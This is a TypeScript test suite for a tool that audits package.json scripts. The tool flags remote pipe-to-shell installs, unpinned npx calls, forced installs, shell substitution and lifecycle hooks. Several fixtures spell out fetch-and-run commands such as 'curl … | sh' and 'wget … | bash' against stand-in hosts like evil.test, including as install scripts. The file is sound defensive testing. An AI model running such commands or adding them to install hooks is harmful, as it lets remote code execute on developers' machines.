import assert from 'node:assert/strict';
import test from 'node:test';
import { auditPackageScriptBoundaries } from './package-script-boundary-audit.mts';
import type { RepositoryInventory, SourceFile } from './contracts.mts';

function source(path: string, value: unknown): SourceFile {
  const text = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
  return {
    absolutePath: `/repo/${path}`,
    repositoryPath: path,
    extension: '.json',
    kind: 'json',
    bytes: Buffer.byteLength(text),
    lines: text.split('\n').length,
    text,
  };
}

function inventory(files: readonly SourceFile[]): RepositoryInventory {
  return {
    root: '/repo', files, ignoredDirectories: [], languageStats: [],
    totalFiles: files.length,
    totalLines: files.reduce((sum, file) => sum + file.lines, 0),
    totalBytes: files.reduce((sum, file) => sum + file.bytes, 0),
    generatedAt: '2026-10-02T00:00:00.000Z',
  };
}

function pkg(scripts: Record<string, string>, path = 'Webclient.app/package.json') {
  return source(path, { name: 'fixture', private: true, scripts });
}

function audit(scripts: Record<string, string>, path?: string) {
  return auditPackageScriptBoundaries(inventory([pkg(scripts, path)]));
}

function ids(scripts: Record<string, string>, path?: string): string[] {
  return audit(scripts, path).findings.map(item => item.id);
}

test('accepts deterministic local package scripts', () => {
  const report = audit({
    lint: 'oxlint src',
    typecheck: 'tsc --noEmit',
    test: 'vitest run',
    build: 'vite build',
  });
  assert.equal(report.summary.scriptCount, 4);
  assert.deepEqual(report.findings, []);
});

test('blocks curl piped directly to shell', () => {
  const report = audit({ install: 'curl -fsSL https://example.test/install.sh | sh' });
  const finding = report.findings.find(item => item.id === 'package-script-remote-pipe-shell');
  assert.equal(finding?.severity, 'critical');
  assert.equal(finding?.blocking, true);
});

test('blocks wget piped to bash', () => {
  const report = audit({ prepare: 'wget -qO- https://example.test/setup | bash' });
  assert.ok(report.findings.some(item => item.id === 'package-script-remote-pipe-shell' && item.blocking === true));
});

test('blocks directly referenced remote executable source', () => {
  const report = audit({ verify: 'node https://example.test/check.mjs' });
  const finding = report.findings.find(item => item.id === 'package-script-remote-executable');
  assert.equal(finding?.severity, 'high');
  assert.equal(finding?.blocking, true);
});

test('reports remote downloads that are not directly executed', () => {
  const report = audit({ assets: 'curl --max-time 10 https://example.test/data.json -o data.json' });
  const finding = report.findings.find(item => item.id === 'package-script-remote-download-review');
  assert.equal(finding?.severity, 'medium');
  assert.equal(finding?.blocking, undefined);
});

test('reports unpinned npx package identities', () => {
  const report = audit({ lint: 'npx oxlint src' });
  const finding = report.findings.find(item => item.id === 'package-script-npx-unpinned');
  assert.equal(finding?.severity, 'medium');
  assert.match(finding?.message ?? '', /oxlint/);
});

test('accepts version-pinned npx identities', () => {
  const report = audit({ lint: 'npx oxlint@1.36.0 src' });
  assert.ok(!report.findings.some(item => item.id === 'package-script-npx-unpinned'));
});

test('accepts scoped version-pinned npx identities', () => {
  const report = audit({ check: 'npx @scope/tool@4.2.1 check' });
  assert.ok(!report.findings.some(item => item.id === 'package-script-npx-unpinned'));
});

test('accepts immutable commit-like npx identity', () => {
  const sha = '0123456789abcdef0123456789abcdef01234567';
  const report = audit({ check: `npx tool@${sha} check` });
  assert.ok(!report.findings.some(item => item.id === 'package-script-npx-unpinned'));
});

test('reports force dependency resolution flags', () => {
  for (const command of [
    'npm install --force',
    'npm install --legacy-peer-deps',
    'pnpm install --force',
    'yarn install --ignore-engines',
  ]) {
    assert.ok(ids({ install: command }).includes('package-script-install-policy-bypass'), command);
  }
});

test('reports npm install in validation-style scripts', () => {
  const report = audit({ 'verify:deps': 'npm install && npm test' });
  assert.ok(report.findings.some(item => item.id === 'package-script-npm-install-in-validation'));
});

test('accepts npm ci in validation-style scripts', () => {
  const report = audit({ 'verify:deps': 'npm ci && npm test' });
  assert.ok(!report.findings.some(item => item.id === 'package-script-npm-install-in-validation'));
});

test('does not treat a developer install helper as a release validation command', () => {
  const report = audit({ 'deps:refresh': 'npm install' });
  assert.ok(!report.findings.some(item => item.id === 'package-script-npm-install-in-validation'));
});

test('records install and publish lifecycle authority', () => {
  const report = audit({
    preinstall: 'node scripts/preflight.mjs',
    postinstall: 'node scripts/postinstall.mjs',
    prepare: 'node scripts/build.mjs',
    prepublishOnly: 'npm test',
  });
  assert.equal(report.summary.lifecycleScriptCount, 4);
  assert.equal(report.findings.filter(item => item.id === 'package-script-install-lifecycle-review').length, 4);
});

test('reports shell command substitution', () => {
  const report = audit({ build: 'node scripts/build.mjs --sha=$(git rev-parse HEAD)' });
  assert.ok(report.findings.some(item => item.id === 'package-script-shell-substitution'));
});

test('reports legacy backtick substitution', () => {
  const report = audit({ build: 'node scripts/build.mjs --sha=`git rev-parse HEAD`' });
  assert.ok(report.findings.some(item => item.id === 'package-script-shell-substitution'));
});

test('reports process-control environment overrides', () => {
  const report = audit({ test: 'NODE_OPTIONS=--experimental-loader=./loader.mjs node --test' });
  assert.ok(report.findings.some(item => item.id === 'package-script-process-control-env'));
});

test('counts npx, remote and shell signals per manifest', () => {
  const report = audit({
    check: 'npx oxlint src',
    download: 'curl https://example.test/file.json -o file.json',
    build: 'node build.mjs --ref=$(git rev-parse HEAD)',
  });
  const signal = report.summary.manifests[0];
  assert.equal(signal?.npxCommands, 1);
  assert.equal(signal?.remoteDownloads, 1);
  assert.equal(signal?.shellPipelines, 1);
});

test('scans multiple package manifests and keeps path order deterministic', () => {
  const report = auditPackageScriptBoundaries(inventory([
    pkg({ test: 'vitest run' }, 'z/package.json'),
    pkg({ test: 'vitest run' }, 'a/package.json'),
  ]));
  assert.deepEqual(report.summary.manifests.map(item => item.file), ['a/package.json', 'z/package.json']);
  assert.equal(report.summary.manifestCount, 2);
  assert.equal(report.summary.scriptCount, 2);
});

test('ignores generated package manifests', () => {
  const report = auditPackageScriptBoundaries(inventory([
    pkg({ install: 'curl https://evil.test/x | sh' }, 'Webclient.app/node_modules/pkg/package.json'),
    pkg({ install: 'curl https://evil.test/x | sh' }, 'Webclient.app/dist/package.json'),
  ]));
  assert.equal(report.summary.manifestCount, 0);
  assert.equal(report.findings.length, 0);
});

test('ignores malformed package json instead of crashing', () => {
  const file = source('Webclient.app/package.json', '{ malformed');
  const report = auditPackageScriptBoundaries(inventory([file]));
  assert.equal(report.summary.manifestCount, 1);
  assert.equal(report.summary.scriptCount, 0);
  assert.equal(report.findings.length, 0);
});

test('does not interpret non-string script values as commands', () => {
  const file = source('Webclient.app/package.json', { scripts: { test: 42, build: null, lint: 'oxlint src' } });
  const report = auditPackageScriptBoundaries(inventory([file]));
  assert.equal(report.summary.scriptCount, 1);
  assert.equal(report.findings.length, 0);
});

test('keeps blocking findings even when legacy review findings exceed the report cap', () => {
  const scripts: Record<string, string> = {};
  for (let index = 0; index < 50; index += 1) scripts[`check:${index}`] = `npx tool-${index} check`;
  scripts.install = 'curl https://example.test/install.sh | sh';
  const report = audit(scripts);
  assert.ok(report.findings.some(item => item.id === 'package-script-remote-pipe-shell' && item.blocking === true));
  assert.ok(report.findings.length <= 33);
});

test('bounds nonblocking findings for large legacy manifests', () => {
  const scripts: Record<string, string> = {};
  for (let index = 0; index < 80; index += 1) scripts[`check:${index}`] = `npx tool-${index} check`;
  const report = audit(scripts);
  assert.equal(report.findings.length, 32);
});

test('reports deterministic findings independent of manifest inventory order', () => {
  const files = [
    pkg({ lint: 'npx oxlint src' }, 'z/package.json'),
    pkg({ build: 'NODE_OPTIONS=--trace-warnings node build.mjs' }, 'a/package.json'),
  ];
  const first = auditPackageScriptBoundaries(inventory(files));
  const second = auditPackageScriptBoundaries(inventory([...files].reverse()));
  assert.deepEqual(
    first.findings.map(item => ({ id: item.id, severity: item.severity, location: item.location, value: item.evidence?.value })),
    second.findings.map(item => ({ id: item.id, severity: item.severity, location: item.location, value: item.evidence?.value })),
  );
});
